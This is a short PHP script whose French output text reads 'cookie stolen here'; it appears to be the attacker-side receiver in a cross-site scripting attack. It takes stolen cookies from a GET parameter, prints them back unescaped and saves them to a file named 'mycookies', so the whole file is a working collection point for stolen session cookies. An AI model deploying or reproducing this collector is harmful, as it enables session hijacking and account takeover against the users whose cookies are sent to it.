<?php

    echo "Cookie volé ici".$_GET["cookies"];
    file_put_contents("mycookies", $_GET["cookies"]);

?>
